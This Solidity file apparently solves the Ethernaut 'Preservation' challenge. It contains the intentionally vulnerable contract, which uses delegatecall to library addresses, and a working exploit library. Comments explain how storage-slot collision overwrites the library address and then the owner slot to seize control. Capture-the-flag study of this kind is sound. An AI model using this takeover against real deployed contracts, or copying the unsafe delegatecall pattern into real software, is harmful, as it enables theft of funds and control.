// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }

    // set the time for timezone 2
    function setSecondTime(uint _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint storedTime;

    function setTime(uint _time) public {
        storedTime = _time;
    }
}

//-n Setup an exploit library contract that stores 3 values
//-n dummy 1 and dummy 2 correspond to storage slots of timeZone1Library & timeZone2Library in the preservation contract
//-n owner corresponds to the storage slot of owner in the Preservation contract

//-n if we can somehow change the address of `timeZone1Library` contract
//-n we can deploy our own exploit contract that can override the storage slot of owner
//-n this can take complete control of the Preservation contract
contract ExploitLibraryContract {
    uint dummy1;
    uint dummy2;
    address owner;

    //-n we use the same signature as defined in Preservation contract
    //-n if next time setTime gets called with an address corresponding to this exploit library
    //-n owner storage slot will be overwritten with the address we are inputting -> enabling a full control on contract
    function setTime(uint _address) public {
        owner = convertUintToAddress(_address);
    }

    //-n helper function to convert address to uint256
    function convertAddressToUint(address _input) public pure returns (uint) {
        return uint256(uint160(_input));
    }

    //-n helper function to convert uint256 to address
    function convertUintToAddress(uint _value) public pure returns (address) {
        return address(uint160(_value));
    }
}
